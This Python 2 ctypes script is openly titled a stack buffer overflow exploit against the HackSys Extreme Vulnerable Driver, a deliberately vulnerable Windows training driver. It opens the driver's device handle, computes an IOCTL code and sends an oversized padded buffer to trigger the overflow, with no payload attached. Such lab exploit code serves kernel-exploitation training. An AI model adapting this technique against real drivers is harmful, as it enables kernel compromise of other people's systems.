from ctypes import *
from ctypes.wintypes import *
import sys

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x00000003
FILE_ATTRIBUTE_NORMAL = 0x00000080
#-------------------------------
FILE_DEVICE_UNKNOWN = 0x00000022
FILE_ANY_ACCESS = 0x00000000
METHOD_NEITHER = 0x00000003
#-------------------------------


def GetHandle():
    print '[*]Getting device handle...'
    lpFileName = u"\\\\.\\HacksysExtremeVulnerableDriver"
    dwDesiredAccess = GENERIC_READ | GENERIC_WRITE
    dwShareMode = 0
    lpSecurityAttributes = None
    dwCreationDisposition = OPEN_EXISTING
    dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    hTemplateFile = None

    handle = windll.kernel32.CreateFileW(lpFileName,
                         dwDesiredAccess,
                         dwShareMode,
                         lpSecurityAttributes,
                         dwCreationDisposition,
                         dwFlagsAndAttributes,
                         hTemplateFile)

    if not handle or handle == -1:
        print "\t[-]Error getting device handle: " + FormatError()
        sys.exit(-1)

    print "\t[+]Got device handle: 0x%x" % handle
    return handle

def ctl_code(function,
             devicetype = FILE_DEVICE_UNKNOWN,
             access = FILE_ANY_ACCESS,
             method = METHOD_NEITHER):
    """Recreate CTL_CODE macro to generate driver IOCTL"""
    return ((devicetype << 16) | (access << 14) | (function << 2) | method)

def trigger(hDevice, dwIoControlCode):
    """Create evil buf and send IOCTL"""
    evilbuf = create_string_buffer("A"*2444 + "B"*8 + "C"*8 + "D"*8)
    lpInBuffer = addressof(evilbuf)
    nInBufferSize = 2069
    lpOutBuffer = None
    nOutBufferSize = 0
    lpBytesReturned = None
    lpOverlapped = None

    pwnd = windll.kernel32.DeviceIoControl(hDevice,
                                           dwIoControlCode,
                                           lpInBuffer,
                                           nInBufferSize,
                                           lpOutBuffer,
                                           nOutBufferSize,
                                           lpBytesReturned,
                                           lpOverlapped)
    if not pwnd:
        print "\t[-]Error: Not pwnd :(\n" + FormatError()
        sys.exit(-1)

if __name__ == "__main__":
    print "\n**HackSys Extreme Vulnerable Driver**"
    print "**Stack buffer overflow exploit**\n"
    trigger(GetHandle(), ctl_code(0x800))